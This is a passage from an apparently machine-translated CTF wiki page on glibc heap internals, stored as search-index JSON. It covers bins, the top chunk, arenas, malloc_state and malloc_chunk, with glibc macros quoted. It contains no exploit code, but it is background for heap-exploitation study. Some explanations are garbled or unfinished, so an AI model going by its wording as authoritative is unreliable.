bins. The size of the chunks in each bin is inconsistent, but within a certain range. In addition, the 63 bins are divided into 6 groups, and the tolerances between the chunk sizes in each group bin are the same, as follows: Group Quantity Tolerance | 1 32 64B | | 2 16 512B | | 3 | 8 | 4096B | | 4 4 32768B | | 5 | 2 | 262144B | | 6 | 1 | No limit | Here we take the large bin of the 32-bit platform as an example. The size of the first chunk of the first large bin is 512 bytes, which is in the first group, so the size of the chunk that the bin can store is [512, 512 + 64). The macro about large bin is as follows. Here we take the initial chunk size of the first large bin on the 32-bit platform as 512 bytes, then 512>>6 = 8, so the subscript is 56+8= 64. #define largebin_index_32(sz) \\ ((((( unsigned long ) ( sz )) >> 6 ) <= 38 ) \\ ? 56 + ((( unsigned long ) ( sz )) >> 6 ) \\ : (((( unsigned long ) ( sz )) >> 9 ) <= 20 ) \\ ? 91 + ((( unsigned long ) ( sz )) >> 9 ) \\ : (((( unsigned long ) ( sz )) >> 12 ) <= 10 ) \\ ? 110 + ((( unsigned long ) ( sz )) >> 12 ) \\ : (((( unsigned long ) ( sz )) >> 15 ) <= 4 ) \\ ? 119 + ((( unsigned long ) ( sz )) >> 15 ) \\ : (((( unsigned long ) ( sz )) >> 18 ) <= 2 ) \\ ? 124 + ((( unsigned long ) ( sz )) >> 18 ) \\ : 126 ) #define largebin_index_32_big(sz) \\ ((((( unsigned long ) ( sz )) >> 6 ) <= 45 ) \\ ? 49 + ((( unsigned long ) ( sz )) >> 6 ) \\ : (((( unsigned long ) ( sz )) >> 9 ) <= 20 ) \\ ? 91 + ((( unsigned long ) ( sz )) >> 9 ) \\ : (((( unsigned long ) ( sz )) >> 12 ) <= 10 ) \\ ? 110 + ((( unsigned long ) ( sz )) >> 12 ) \\ : (((( unsigned long ) ( sz )) >> 15 ) <= 4 ) \\ ? 119 + ((( unsigned long ) ( sz )) >> 15 ) \\ : (((( unsigned long ) ( sz )) >> 18 ) <= 2 ) \\ ? 124 + ((( unsigned long ) ( sz )) >> 18 ) \\ : 126 ) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \\ ((((( unsigned long ) ( sz )) >> 6 ) <= 48 ) \\ ? 48 + ((( unsigned long ) ( sz )) >> 6 ) \\ : (((( unsigned long ) ( sz )) >> 9 ) <= 20 ) \\ ? 91 + ((( unsigned long ) ( sz )) >> 9 ) \\ : (((( unsigned long ) ( sz )) >> 12 ) <= 10 ) \\ ? 110 + ((( unsigned long ) ( sz )) >> 12 ) \\ : (((( unsigned long ) ( sz )) >> 15 ) <= 4 ) \\ ? 119 + ((( unsigned long ) ( sz )) >> 15 ) \\ : (((( unsigned long ) ( sz )) >> 18 ) <= 2 ) \\ ? 124 + ((( unsigned long ) ( sz )) >> 18 ) \\ : 126 ) #define largebin_index(sz) \\ ( SIZE_SZ == 8 ? largebin_index_64 ( sz ) : MALLOC_ALIGNMENT == 16 \\ ? largebin_index_32_big ( sz ) \\ : largebin_index_32 ( sz )) Unsorted Bin \u00b6 Unsorted bin can be thought of as a buffer before the free chunk returns to its own bin. Its specific description in glibc is as follows /* Unsorted chunks All remainders from chunk splits, as well as all returned chunks, are first placed in the \"unsorted\" bin. They are then placed in regular bins after malloc gives them ONE chance to be used before binning. So, basically, the unsorted_chunks list acts as a queue, with chunks being placed on it in free (and malloc_consolidate), and taken off (to be either used or placed in bins) in malloc. The NON_MAIN_ARENA flag is never set for unsorted chunks, so it does not have to be taken into account in size comparisons. */ From the macro below we can see /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */ #define unsorted_chunks(M) (bin_at(M, 1)) The unsorted bin is at the subscript 1 of the bin array we mentioned earlier. Therefore, the unsorted bin has only one linked list. Idle chunks in unsorted bin are out of order, with two main sources When a larger chunk is split into two halves, if the rest is greater than MINSIZE, it will be placed in the unsorted bin. When a chunk that does not belong to the fast bin is released, and the chunk is not in close proximity to the top chunk, the chunk is first placed in the unsorted bin. For an explanation of the top chunk, please refer to the introduction below. In addition, the traversal order used by Unsorted Bin during the process is FIFO. common macro \u00b6 Here are some general macros. Unified to get the index of the chunk according to the size of the chunk #define bin_index(sz) \\ (( in_smallbin_range ( sz )) ? smallbin_index ( sz ) : largebin_index ( sz )) Top Chunk \u00b6 The description of top chunk in glibc is as follows /* Top The top-most available chunk (i.e., the one bordering the end of available memory) is treated specially. It is never included in any bin, is used only if no other chunk is available, and is released back to the system if it is very large (see M_TRIM_THRESHOLD). Because top initially points to its own bin with initial zero size, thus forcing extension on the first malloc request, we avoid having any special code in malloc to check whether it even exists yet. But we still need to do so when getting memory from system, so we make initial_top treat the bin as a legal but unusable chunk during the interval between initialization and the first call to sysmalloc. (This is somewhat delicate, since it relies on the 2 preceding words to be zero during this interval as well.) */ /* Conveniently, the unsorted bin can be used as dummy top on first call */ #define initial_top(M) (unsorted_chunks(M)) When the program first performs malloc, the heap is divided into two pieces, one for the user, and the remaining one is the top chunk. In fact, the so-called top chunk is the chunk with the highest physical address in the current heap. This chunk does not belong to any bin. Its function is to allocate all the bins if they are not up to the specified size. If the size is not less than the specified size, the allocation is made and the remaining part is used as the new top chunk. Otherwise, the heap is expanded and then allocated. The heap is extended by sbrk in the main arena, and the new heap is allocated by the mmap in the thread arena. It should be noted that the prev_inuse bit of the top chunk is always 1, otherwise the previous chunk will be merged into the top chunk. In the initial case, we can use the unsorted chunk as the top chunk. last remainder \u00b6 When a user uses malloc to request memory allocation, the chunk found by ptmalloc2 may not match the size of the requested memory. In this case, the remaining portion after the split is called the last remainder chunk, and the unsort bin will also store the chunk. The top chunk splits the rest of the section as a last remainder. Macrostructure \u00b6 arena \u00b6 In the example we introduced earlier, whether it is the main thread or the newly created thread, there will be a separate arena when applying for memory for the first time. So will each thread have an independent arena? Below we will introduce in detail. arena Quantity \u00b6 For different systems, the [constraints] of the number of arena ( https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L847 ) are as follows For 32 bit systems: Number of arena = 2 * number of cores. For 64 bit systems: Number of arena = 8 * number of cores. Obviously, not every thread will have a corresponding arena. As for why the 64-bit system is set up, I don't want to understand it. In addition, because the number of cores per system is limited, when the number of threads is more than twice the number of cores (hyperthreading technology), there must be threads waiting, so there is no need to assign an arena to each thread. arena Distribution Rules \u00b6 To be added. the difference \u00b6 Unlike thread, main_arena is not in the applied heap, but a global variable in the data segment of libc.so. heap_info \u00b6 When the program first starts executing, each thread has no heap area. When it applies for memory, it needs a structure to record the corresponding information, and the role of heap_info is this. And when the resources of the heap are used, you must apply for memory again. In addition, the generally applied heap is not continuous, so it is necessary to record the link structure between different heaps. This data structure is specifically prepared for memory requested from the Memory Mapping Segment, which is prepared for non-primary threads. The main thread can be extended by the program break location via the sbrk() function (until it touches the Memory Mapping Segment), with only one heap and no heap_info data structure. The main structure of heap_info is as follows #define HEAP_MIN_SIZE (32 * 1024) #ifndef HEAP_MAX_SIZE # ifdef DEFAULT_MMAP_THRESHOLD_MAX # define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX) # else # define HEAP_MAX_SIZE (1024 * 1024) /* must be a power of two */ # endif #endif /* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps that are dynamically created for multi-threaded programs. The maximum size must be a power of two, for fast determination of which heap belongs to a chunk. It should be much larger than the mmap threshold, so that requests with a size just below that threshold can be fulfilled without creating too many heaps. */ /***************************************************************************/ /* A heap is a single contiguous memory region holding (coalesceable) malloc_chunks. It is allocated with mmap() and always starts at an address aligned to HEAP_MAX_SIZE. */ typedef struct _heap_info { mstate ar_ptr ; /* Arena for this heap. */ struct _heap_info * prev ; /* Previous heap. */ size_t size ; /* Current size in bytes. */ size_t mprotect_size ; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad [ -6 * SIZE_SZ & MALLOC_ALIGN_MASK ]; } heap_info ; This structure is mainly to describe the basic information of the heap, including the address of the corresponding arena of the heap Since a thread requests a heap, it may be used up and must be applied again. Therefore, one thread may have multiple heaps. Prev records the address of the last heap_info. Here you can see that each heap's heap_info is linked through a singly linked list. size indicates the size of the current heap The last part ensures alignment ( What is the reason for the negative use here? ) It seems that the structure should be quite important, but if we look closely at the implementation of the full malloc, we will find that it does not appear frequently. malloc_state \u00b6 This structure is used to manage the heap and record the specific state of the memory of each arena's current application, such as whether there are free chunks, what size of free chunks, and so on. Whether it is thread arena or main arena, they all have only one malloc state structure. Since there may be more than one of the thread's arena, the malloc state structure will be in the latest application's arena. Note that the main arena's malloc_state is not part of the heap segment, but a global variable stored in the libc.so data segment. Its structure is as follows struct malloc_state { /* Serialize access. */ __libc_lock_define (, mutex ); /* Flags (formerly in max_fast). */ int flags ; /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top ; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder ; /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; /* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/ unsigned int binmap [ BINMAPSIZE ]; /* Linked list, points to the next arena */ struct malloc_state * next ; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state * next_free ; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads ; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem ; INTERNAL_SIZE_T max_system_mem ; }; __libc_lock_define(, mutex); This variable is used to control the serial access of the program to the same allocation area. When a thread acquires the allocation area, other threads must wait for the thread allocation to complete before they can access the allocation area. flags flags records some flags of the allocation area. For example, bit0 records whether the allocation area has a fast bin chunk, and bit1 identifies whether the allocation area can return a continuous virtual address space. details as follows /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) fastbinsY[NFASTBINS] a pointer to the head of each fast chunk list top Point to the top chunk of the allocation area last_reminder The remaining part after the latest chunk split bins A chunk list for storing unstored bins, small bins and large bins. binmap ptmalloc uses a bit to identify whether a bin contains free chunks. malloc_par \u00b6 ! ! To be added! !","title":"Heap Related Data Structure"},{"location":"pwn/linux/glibc-heap/heap_structure/#related-data-structure","text":"The operation of the heap is so complicated, so there must be a well-designed data structure inside glibc to manage it. The data structure corresponding to the heap is mainly divided into A macro structure that contains macro information about the heap through which the basic information of the heap can be indexed. Microstructure, which is used to specifically handle the allocation and reclaiming of memory blocks.","title":"\u5806related data structure"},{"location":"pwn/linux/glibc-heap/heap_structure/#overview","text":"Give a macro picture here.","title":"Overview\uff1f\uff1f\uff1f\uff1f"},{"location":"pwn/linux/glibc-heap/heap_structure/#micro-structure","text":"Here we first introduce the structure of the details in the heap, and the vulnerability of the heap is closely related to these structures**.","title":"micro structure"},{"location":"pwn/linux/glibc-heap/heap_structure/#malloc_chunk","text":"","title":"malloc_chunk"},{"location":"pwn/linux/glibc-heap/heap_structure/#overview_1","text":"During the execution of the program, we call the memory requested by malloc as chunk. This memory is represented inside the ptmalloc by the malloc_chunk structure. When the chunk requested by the program is free, it will be added to the corresponding idle management list. Very interestingly, they all use a uniform structure regardless of the size of a chunk, whether it is allocated or released. Although they use the same data structure, they will behave differently depending on whether they are released. The structure of malloc_chunk is as follows /* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size ; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size ; /* Size in bytes, including overhead. */ struct malloc_chunk * fd ; /* double links -- used only if free. */ struct malloc_chunk * bk ; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk * fd_nextsize ; /* double links -- used only if free. */ struct malloc_chunk * bk_nextsize ; }; First, here are some necessary explanations INTERNAL_SIZE_T, SIZE_SZ, MALLOC_ALIGN_MASK: /* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of chunk sizes. The default version is the same as size_t. While not strictly necessary, it is best to define this as an unsigned type, even if size_t is a signed type. This may avoid some artificial size limitations on some systems. On a 64-bit machine, you may be able to reduce malloc overhead by defining INTERNAL_SIZE_T to be a 32 bit `unsigned int' at the expense of not being able to handle more than 2^32 of malloced space. If this limitation is acceptable, you are encouraged to set this unless you are on a platform requiring 16byte alignments. In this case the alignment requirements turn out to negate any potential advantages of decreasing size_t word size. Implementors: Beware of the possible combinations of: - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits, and might be the same width as int or as long - size_t might have different width and signedness as INTERNAL_SIZE_T - int and long might be 32 or 64 bits, and might be the same width To deal with this, most comparisons and difference computations among INTERNAL_SIZE_Ts should cast them to unsigned long, being aware of the fact that casting an unsigned int to a wider long does not sign-extend. (This also makes checking for negative numbers awkward.) Some of these casts result in harmless compiler warnings on some systems. */ #ifndef INTERNAL_SIZE_T # define INTERNAL_SIZE_T size_t #endif /* The corresponding word size. */ #define SIZE_SZ (sizeof (INTERNAL_SIZE_T)) /* The corresponding bit mask value. */ #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) In general, size_t is a 64-bit unsigned integer in 64 bits and a 32-bit unsigned integer in 32 bits. The specific explanation of each field is as follows prev_size , if the chunk's physically adjacent previous address chunk (the address difference between the two pointers is the previous chunk size) is idle, then the field records the previous chunk The size (including the chunk header). Otherwise, this field can be used to store data for the physical chunk of the previous chunk. The previous chunk here refers to the chunk of the lower address. size , the size of the chunk, the size must be an integer multiple of 2 * SIZE_SZ. If the requested memory size is not an integer multiple of 2 * SIZE_SZ, it will be converted to a multiple of the smallest 2 * SIZE_SZ that satisfies the size. In a 32-bit system, SIZE_SZ is 4; in a 64-bit system, SIZE_SZ is 8. The lower three bits of this field have no effect on the size of the chunk, they are represented from high to low respectively. NON_MAIN_ARENA, records whether the current chunk does not belong to the main thread, 1 means not belonging, 0 means belongs. IS_MAPPED, which records whether the current chunk is allocated by mmap. PREV_INUSE, records whether the previous chunk is allocated. In general, the P bit of the size field of the first allocated memory block in the heap is set to 1, in order to prevent access to the previous illegal memory. When the P bit of the size of a chunk is 0, we can get the size and address of the previous chunk through the prev_size field. This also facilitates the merging between free chunks. fd, bk . When the chunk is in the allocation state, it is the user's data starting from the fd field. When chunk is idle, it will be added to the corresponding idle management list. The meaning of the fields is as follows fd points to the next (non-physical neighbor) free chunk bk points to the previous (non-physical neighbor) free chunk Freed chunks can be added to the free chunk block list for unified management via fd and bk fd_nextsize, bk_nextsize , which is only used when the chunk is free, but it is used for larger chunks. fd_nextsize points to the first free block of the previous size that is different from the current chunk, and does not contain the head pointer of the bin. bk_nextsize points to the next free block of the current chunk size, excluding the head pointer of the bin. Large chunks that are generally free are arranged in descending order of fd, in descending order. Doing so avoids traversing when looking for a suitable chunk. The appearance of an already allocated chunk is as follows. We call the first two fields called chunk headers, and the latter part is called user data. The memory pointer obtained by each malloc application actually points to the beginning of user data. When a chunk is in use, its prev_size field of the next chunk is invalid, and the part of the next chunk can also be used by the current chunk. This is the spatial reuse in the chunk. chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk , if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk , in bytes | A | M | P | mem -> + - + - + - + - + - + - + - + - + - + - + + + + + + + + + + - + - + - + - + - + - + - + - + - + - + - + - + - + | User data starts here ... . . . . ( malloc_usable_size () bytes ) . next . | chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | ( size of chunk , but used for application data ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk , in bytes | A | 0 | 1 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ The released chunks are recorded in a linked list (either a circular doubly linked list or a singly linked list). The specific structure is as follows chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk , if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ` head : ' | Size of chunk , in bytes | A | 0 | P | mem -> + - + - + - + - + - + - + - + - + - + - + + + + + + + + + + - + - + - + - + - + - + - + - + - + - + - + - + - + | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space ( may be 0 bytes long ) . . . next . | chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ` foot : ' | Size of chunk , in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk , in bytes | A | 0 | 0 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ It can be found that if a chunk is in the free state, there will be two locations to record their corresponding sizes. The size field itself will be logged, The chunks following it will be logged. In general, , two free chunks of physical neighbors will be merged into one chunk. The heap manager merges two physically adjacent free chunk chunks through the prev_size field and the size field. ! ! ! Some constraints on the heap, consider it in detail later! ! ! /* The three exceptions to all this are: 1. The special chunk `top' doesn't bother using the trailing size field since there is no next contiguous chunk that would have to index off it. After initialization, `top' is forced to always exist. If it would become less than MINSIZE bytes long, it is replenished. 2. Chunks allocated via mmap, which have the second-lowest-order bit M (IS_MMAPPED) set in their size fields. Because they are allocated one-by-one, each must contain its own trailing size field. If the M bit is set, the other bits are ignored (because mmapped chunks are neither in an arena, nor adjacent to a freed chunk). The M bit is also used for chunks which originally came from a dumped heap via malloc_set_state in hooks.c. 3. Chunks in fastbins are treated as allocated chunks from the point of view of the chunk allocator. They are consolidated with their neighbors only in bulk, in malloc_consolidate. */","title":"Overview"},{"location":"pwn/linux/glibc-heap/heap_structure/#chunk-related-macro","text":"Here mainly introduces the size of the chunk, the alignment check, and some macros for conversion. chunk and mem pointer header conversion Mem points to the starting position of the memory the user gets. /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ)) Minimum chunk size /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) Here, the offsetof function calculates the offset of fd_nextsize in malloc_chunk, indicating that the smallest chunk must contain at least the bk pointer. Minimum requested heap memory size The memory size requested by the user must be a minimum integer multiple of 2 * SIZE_SZ. Note: As for the current MIN_CHUNK_SIZE and MINSIZE sizes are the same, I personally think that the reason to add two macros is to facilitate the later modification of malloc_chunk. /* The smallest size we can malloc is an aligned minimal chunk */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define MINSIZE \\ ( unsigned long ) ((( MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK ) & \\ ~ MALLOC_ALIGN_MASK )) Check if the memory allocated to the user is aligned 2 * SIZE_SZ size aligned. /* Check if m has acceptable alignment */ // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ (( uintptr_t )( MALLOC_ALIGNMENT == 2 * SIZE_SZ ? ( p ) : chunk2mem ( p )) & \\ MALLOC_ALIGN_MASK ) Request Byte Count Judgment /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ (( unsigned long ) ( req ) >= ( unsigned long ) ( INTERNAL_SIZE_T )( -2 * MINSIZE )) Convert user request memory size to actual allocated memory size /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ ((( req ) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE ) \\ ? MINSIZE \\ : (( req ) + SIZE_SZ + MALLOC_ALIGN_MASK ) & ~ MALLOC_ALIGN_MASK ) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if ( REQUEST_OUT_OF_RANGE ( req )) { \\ __set_errno ( ENOMEM ); \\ return 0 ; \\ } \\ ( sz ) = request2size ( req ); When a chunk is in the allocated state, the prev_size field of its next physical next chunk must be invalid, so this field can be used by the current chunk. This is the multiplexing between chunks in ptmalloc. The specific process is as follows First, use REQUEST_OUT_OF_RANGE to determine if the chunk of the byte size requested by the user can be allocated. Second, it should be noted that the byte requested by the user is used to store data, that is, the part after the chunk header. At the same time, due to the multiplexing between chunks, the prev_size field of the next chunk can be used. Therefore, you only need to add the SIZE_SZ size to fully store the content. Since the minimum chunk of the application allowed in the system is MINSIZE, it is compared. If the minimum requirement is not met, then the MINSIZE byte needs to be allocated directly. If it is greater, because the chunk requested in the system requires 2 * SIZE_SZ alignment, MALLOC_ALIGN_MASK needs to be added here to facilitate alignment. Personally think that it is not necessary to add MALLOC_ALIGN_MASK in the first line of the request2size macro. It should be noted that the size obtained by such a calculation formula must ultimately satisfy the user's needs. Marker related /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */ #define PREV_INUSE 0x1 /* extract inuse bit of previous chunk */ #define prev_inuse(p) ((p)->mchunk_size & PREV_INUSE) /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->mchunk_size & IS_MMAPPED) /* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */ #define NON_MAIN_ARENA 0x4 /* Check for chunk from main arena. */ #define chunk_main_arena(p) (((p)->mchunk_size & NON_MAIN_ARENA) == 0) /* Mark a chunk as not being on the main arena. */ #define set_non_main_arena(p) ((p)->mchunk_size |= NON_MAIN_ARENA) /* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Get chunk size /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) Get the next physical neighboring chunk /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) Get information about the previous chunk /* Size of the chunk below P. Only valid if !prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Set the size of the chunk below P. Only valid if !prev_inuse (P). */ #define set_prev_size(p, sz) ((p)->mchunk_prev_size = (sz)) /* Ptr to previous physical malloc_chunk. Only valid if !prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) Current chunk usage status related operations /* extract p's inuse bit */ #define inuse(p) \\ (((( mchunkptr )((( char * ) ( p )) + chunksize ( p ))) -> mchunk_size ) & PREV_INUSE ) /* set/clear chunk as being inuse without otherwise disturbing */ #define set_inuse(p) \\ (( mchunkptr )((( char * ) ( p )) + chunksize ( p ))) -> mchunk_size |= PREV_INUSE #define clear_inuse(p) \\ (( mchunkptr )((( char * ) ( p )) + chunksize ( p ))) -> mchunk_size &= ~ ( PREV_INUSE ) Set the size field of the chunk /* Set size at head, without disturbing its use bit */ // SIZE_BITS = 7 #define set_head_size(p, s) \\ (( p ) -> mchunk_size = ((( p ) -> mchunk_size & SIZE_BITS ) | ( s ))) /* Set size/use field */ #define set_head(p, s) ((p)->mchunk_size = (s)) /* Set size at footer (only when chunk is not in use) */ #define set_foot(p, s) \\ ((( mchunkptr )(( char * ) ( p ) + ( s ))) -> mchunk_prev_size = ( s )) Get the chunk of the specified offset /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) Specify the offset at the chunk usage state related operation /* check/set/clear inuse bits in known places */ #define inuse_bit_at_offset(p, s) \\ ((( mchunkptr )((( char * ) ( p )) + ( s ))) -> mchunk_size & PREV_INUSE ) #define set_inuse_bit_at_offset(p, s) \\ ((( mchunkptr )((( char * ) ( p )) + ( s ))) -> mchunk_size |= PREV_INUSE ) #define clear_inuse_bit_at_offset(p, s) \\ ((( mchunkptr )((( char * ) ( p )) + ( s ))) -> mchunk_size &= ~ ( PREV_INUSE ))","title":"chunk related macro"},{"location":"pwn/linux/glibc-heap/heap_structure/#am","text":"","title":"am"},{"location":"pwn/linux/glibc-heap/heap_structure/#overview_2","text":"We have said that the chunks released by the user will not be returned to the system immediately, and ptmalloc will uniformly manage the free chunks in the heap area of the heap and mmap. When the user again requests memory allocation, the ptmalloc allocator will attempt to pick a suitable one for the user in the free chunk. This avoids frequent system calls and reduces the overhead of memory allocation. In a specific implementation, ptmalloc manages idle chunks in a bin-wise manner. First, it will initially classify chunks into four categories based on the size of the free chunks and the state of use: fast bins, small bins, large bins, unsorted bins. There is still a finer division in each class, and similarly sized chunks are linked by a doubly linked list. That is to say, there will still be multiple unrelated lists in each type of bin to hold chunks of different sizes. For small bins, large bins, unsorted bins, ptmalloc maintains them in the same array. The data structure corresponding to these bins is in malloc_state, as follows #define NBINS 128 /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; Although the header of each bin uses the mchunkptr data structure, this is just for the convenience of converting each bin into a malloc_chunk pointer. When we use it, we will use this pointer as a chunk's fd or bk pointer to link together the free heap blocks. This saves space and increases usability. How is it saved? Here we take 32-bit system as an example. Meaning bin1 fd/bin2 prev_size bin1 bk/bin2 size bin2 fd/bin3 prev_size bin2 bk/bin3 size | bin bottom board | 0 | 1 | 2 | 3 | It can be seen that in addition to the first bin (unsorted bin), each subsequent bin will share the field of the previous bin, which is treated as the prev_size and size of the malloc chunk. Here also illustrates a problem, the subscript of bin is not consistent with the first few bins we are talking about. At the same time, the prev_size and size fields of the chunk of the bin header cannot be modified casually, because these two fields are used by other bins. The bin in the array is described as follows The first one is unsorted bin, the word is like this, the chunks inside are not sorted, and the stored chunks are more complicated. The bins with indexes from 2 to 63 are called small bins, and the chunks in the same small bin list are the same size. The number of bytes in the small bin list of two adjacent indexes differs by 2 machine words long , that is, 32 bits differ by 8 bytes, and 64 bits differ by 16 bytes. The bin behind small bins is called large bins. Each bin in large bins contains a range of chunks, with chunks arranged in descending order of fd pointers. Chunks of the same size are also arranged in the order of recent use. In addition, the arrangement of these bins will follow a principle: Any two physically adjacent free chunks cannot be together . It should be noted that not all chunks are released into the bin immediately after they are released. In order to increase the speed of allocation, ptmalloc will put some small chunks into the container of fast bins. Moreover, the usage flags of the chunks in the fastbin container are always set, so the above principles are not met. ** Bin general macro is as follows typedef struct malloc_chunk * mbinptr ; /* addressing -- note that bin_at(0) does not exist */ #define bin_at(m, i) \\ ( mbinptr )((( char * ) & (( m ) -> bins [ (( i ) -1 ) * 2 ])) - \\ offsetof ( struct malloc_chunk , fd )) /* analog of ++bin */ / / Get the address of the next bin #define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1))) /* Reminders about list directionality within bins */ // These two macros can be used to traverse the bin / / Get the chunk of the bin at the head of the list header #define first(b) ((b)->fd) / / Get the chunk of the bin at the end of the chain #define last(b) ((b)->bk)","title":"Overview"},{"location":"pwn/linux/glibc-heap/heap_structure/#fast-bin","text":"Most programs often apply and release some smaller blocks of memory. If some smaller chunks are released and there are free chunks adjacent to them and merged, then the next time you apply for the chunk of the corresponding size again, you need to split the chunk, which greatly reduces the heap. usage 